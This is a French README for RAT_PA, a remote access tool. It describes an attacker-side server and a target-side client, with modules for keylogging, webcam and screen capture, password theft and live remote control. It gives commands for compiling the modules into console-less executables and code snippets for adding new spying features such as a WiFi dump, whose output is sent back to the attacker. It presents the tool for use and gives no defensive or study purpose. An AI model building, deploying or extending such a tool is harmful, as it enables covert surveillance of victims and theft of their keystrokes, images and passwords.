# RAT_PA - Remote Access Tool

**RAT_PA** est un projet de Remote Access Tool permettant à une machine "attaquante" de prendre le contrôle partiel d'une machine "cible" via l'exécution de commandes et la récupération de données.

---

## 🧠 Principe général

Le projet se compose de deux parties :
- **Serveur local** (côté attaquant) → situé dans `config/server.py`
- **Client serveur** (côté cible) → situé dans `config/client_server.py`

Les fonctionnalités (keylogger, capture webcam, screenshot, récupération des mots de passe, etc.) sont contenues dans le dossier `ressources` et compilées en `.exe`.



## ⚙️ Compilation des EXE

Toutes les fonctionnalités doivent être compilées en exécutables `.exe` sans console avec la commande suivante :

```bash
pyinstaller --onefile --noconsole fichier_python.py

```
🚀 Lancement du RAT
🔹 Sur la machine attaquante :
```bash
python config/server.py
```
Admin > te permet d’envoyer les commandes aux machines connectées.

🔹 Sur la machine cible :
Lancer l’exécutable compilé rat_client.exe,qui va s'occuper de lancer les fonctionnalités selon les cmd reçues.

✉️ Fonctionnement
Le serveur local écoute les connexions entrantes, envoie des commandes et reçoit des fichiers.

Le client cible écoute les commandes reçues, lance l'exécutable correspondant, puis renvoie le fichier résultant au serveur.

Les fichiers reçus sont automatiquement sauvegardés dans les bons dossiers (captures/, keylogs/, etc.).

🧩 Ajouter une nouvelle fonctionnalité
Créer le script Python dans ressources/
Exemple : wifi_dump.py

Compiler en .exe :

```bash
pyinstaller --onefile --noconsole wifi_dump.py
```

Côté client_server.py :

Ajouter le chemin vers l'exécutable :
```
WIFI_DUMP_EXE = os.path.join(BASE_DIR, "wifi_dump.exe")
```
Ajouter un elif dans handle_commands() :
```
elif command == "wifi_dump":
    subprocess.run([WIFI_DUMP_EXE], check=True)
    # récupérer et envoyer le fichier généré
```

Côté server.py :

Ajouter la gestion des données reçues :
```
elif file_type == "wifi_dump":
    os.makedirs("captures/wifi", exist_ok=True)
    path = os.path.join("captures/wifi", filename)
    with open(path, "wb") as f:
        f.write(bytes.fromhex(file_data))
    print(f"[+] WiFi dump reçu et sauvegardé : {path}")
```

✅ Commandes disponibles

Commande	Description
screenshot	Capture d’écran de la machine cible
capture_image	Capture d’image via la webcam
capture_video	Enregistre une vidéo via la webcam (5s)
keylogger	Récupère les frappes clavier
remote	Lance un accès distant (flux vidéo live)
exit	Ferme le serveur local

🗃 Emplacements des fichiers reçus

Type de donnée	Emplacement côté serveur attaquant
Keylogger	captures/keylogs/
Passwords	bdd/rat.db (table passwords)
Webcam / Vidéo	captures/
Screenshots	captures/screenshot/

